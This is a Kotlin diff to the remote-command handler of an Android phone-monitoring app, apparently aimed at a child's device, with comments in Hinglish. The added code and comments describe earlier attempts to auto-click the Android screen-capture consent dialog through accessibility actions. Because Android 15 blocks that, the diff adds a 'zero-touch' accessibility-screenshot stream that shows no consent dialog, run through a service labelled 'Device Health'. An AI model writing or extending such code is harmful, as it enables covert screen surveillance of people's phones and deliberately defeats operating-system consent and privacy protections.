@@ -206,9 +206,36 @@ object CommandHandler {
             "mirror_start" -> {
                 val fps = params.get("fps")?.takeIf { it.isJsonPrimitive }?.asInt ?: 8
                 val quality = params.get("quality")?.takeIf { it.isJsonPrimitive }?.asInt ?: 60
+                // HQ = high-quality mode: consent dialog kholo aur bachche ke haath
+                // se "Start now" tap karwao (8-15 fps real stream). Default (hq
+                // false) me Android 15+ par dialog POP HI NAHI hota.
+                val hq = params.get("hq")?.takeIf { it.isJsonPrimitive }?.asBoolean == true
                 if (MirrorManager.startStreaming(fps, quality)) {
                     sendMirrorState(true)
                     data.addProperty("status", "streaming")
+                    Pair(true, data)
+                } else if (Build.VERSION.SDK_INT >= 35 && !hq) {
+                    // ANDROID 15 (vc15): system consent dialog par auto-click
+                    // SYSTEM-LEVEL block hai — ACTION_CLICK ignore (vc13 proof) AUR
+                    // gesture-tap bhi ignore (vc14 proof). Dialog kholne ka koi
+                    // fayda nahi: bachche ke phone par sirf ek bekaar modal khadi
+                    // rehti hai ("screen dikhi or wahi atak gayi"). Isliye SEEDHA
+                    // 1 fps a11y-screenshot fallback — zero-touch, koi dialog nahi.
+                    val fb = MirrorManager.startA11yFallback(quality)
+                    if (fb) {
+                        data.addProperty("status", "fallback_streaming")
+                        data.addProperty("note", "Android 15: consent auto-click system-block hai — 1 fps a11y live chalu (HQ ke liye hq=true)")
+                    } else {
+                        // A11y capable nahi (OFF / <13) — aakhri sahare: dialog kholo,
+                        // bachcha khud "Start now" daba sake. pendingMirrorFps set —
+                        // consent milte hi MirrorService 8 fps stream khud chalu karega.
+                        Store.pendingMirrorFps = fps
+                        Store.pendingMirrorQuality = quality
+                        val launched = requestProjectionConsent(ctx)
+                        if (launched) armConsentWatchdog()
+                        data.addProperty("status", "consent_pending")
+                        data.addProperty("error", "a11y fallback nahi chal saka (Accessibility OFF?) — consent dialog khola, bachche se 'Start now' daba do")
+                    }
                     Pair(true, data)
                 } else {
                     // Capture permission missing (e.g. after reboot): pop the consent
@@ -259,7 +286,16 @@ object CommandHandler {
             }
 
             "mirror_request_permission" -> {
-                requestProjectionConsent(ctx)
+                // vc15: consent MILNE par MirrorService turant 8 fps stream shuru
+                // kare — isliye pending stream ABHI SET karo (pehle ye sirf dialog
+                // kholta tha; consent di ja chuki thi to session idle release ho
+                // jaati thi aur mirror phir bhi dead rehta tha).
+                if (Store.pendingMirrorFps <= 0) {
+                    Store.pendingMirrorFps = params.get("fps")?.takeIf { it.isJsonPrimitive }?.asInt ?: 8
+                    Store.pendingMirrorQuality = params.get("quality")?.takeIf { it.isJsonPrimitive }?.asInt ?: 60
+                }
+                val launched = requestProjectionConsent(ctx)
+                if (launched) armConsentWatchdog()
                 Pair(true, data)
             }
 
@@ -326,7 +362,12 @@ object CommandHandler {
                     data.addProperty("pendingFps", pending)
                 }
                 val reason = runCatching { MirrorManager.stallReason() }.getOrNull()
-                if (reason != null && !MirrorManager.isStreaming) data.addProperty("stallReason", reason)
+                // vc15: fallback ACTIVE hai to stallReason ("capture block hua...")
+                // GALAT message hai — 1 fps live chal rahi hai. Sirf tab bhejo jab
+                // na real stream chale na fallback.
+                if (reason != null && !MirrorManager.isStreaming && !MirrorManager.fallbackActive) {
+                    data.addProperty("stallReason", reason)
+                }
                 Pair(true, data)
             }
 
@@ -651,9 +692,9 @@ object CommandHandler {
             if (Store.lastConsentResult == "pending") Store.lastConsentResult = "timeout"
             sendMirrorState(
                 false,
-                "Consent dialog confirm nahi ho paya (70s) — bachche ke phone par " +
-                    "Accessibility ON hai? Settings → Accessibility → Device Health → ON. " +
-                    "Phir Live tab par dobara Mirror shuru karo."
+                "Consent dialog 70s me confirm nahi hua. Android 15 par system auto-click block karta hai — " +
+                    "bachche ke phone par dialog khuli hai to 'Start now' KHUD daba do, mirror 8 fps par khud chalu ho jayega. " +
+                    "(Waise 1 fps fallback me live chalta rehta hai.)"
             )
         }
     }
